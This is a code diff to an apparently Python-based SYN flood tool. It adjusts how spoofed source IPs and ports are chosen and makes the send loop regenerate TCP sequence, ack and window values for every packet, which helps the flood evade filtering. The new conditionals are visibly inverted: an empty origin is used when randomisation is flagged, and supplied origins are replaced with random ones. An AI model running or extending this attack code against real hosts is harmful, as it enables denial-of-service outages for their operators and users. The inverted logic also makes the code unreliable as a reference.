@@ -17,10 +17,15 @@ def scheduleSynFlood(args):
     Returns:
         None
     '''
+    useRandomOrigin = False
+    useRandomOriginPort = False
+
     if args.origin is None:
-        args.origin = [GenerateRandomIp()]
+        args.origin = [""]
+        useRandomOrigin = True
     if args.origin_port is None:
-        args.origin_port = [GenerateRandomSafePort()]
+        args.origin_port = [""]
+        useRandomOriginPort = True
 
     jobs = []
     for origin in args.origin:
@@ -28,8 +33,8 @@ def scheduleSynFlood(args):
             for target in args.target:
                 for port in args.target_port:
                     for i in range(1, args.workers+1):
-                        params = {'origin_ip': origin,
-                                  'origin_port': oport,
+                        params = {'origin_ip': origin if useRandomOrigin else GenerateRandomIp(),
+                                  'origin_port': oport if useRandomOriginPort else GenerateRandomSafePort(),
                                   'target_ip': target, 
                                   'target_port': port, 
                                   'interface' : args.interface,
@@ -90,11 +95,7 @@ def doSynFlood(origin_ip=None, origin_port=None,
     tcp_layer.sport = origin_port
     tcp_layer.dport = target_port
     tcp_layer.flags = "S"
-    tcp_layer.seq = GenerateRandomSafeSeq()
-    tcp_layer.ack = GenerateRandomSafeSeq()
-    tcp_layer.window = GenerateRandomWindow()
 
-    attack_packet = ip_layer/tcp_layer
 
     # Prepare timings
     time_start = time()
@@ -103,6 +104,14 @@ def doSynFlood(origin_ip=None, origin_port=None,
 
     # Start attack
     while (time() <= time_end): #duration
+
+        # Constantly changing values
+        tcp_layer.seq = GenerateRandomSafeSeq()
+        tcp_layer.ack = GenerateRandomSafeSeq()
+        tcp_layer.window = GenerateRandomWindow()
+
+        attack_packet = ip_layer/tcp_layer # packet to send
+
         send(attack_packet, iface=interface)
         if gap > 0:
             sleep(gap) #gap
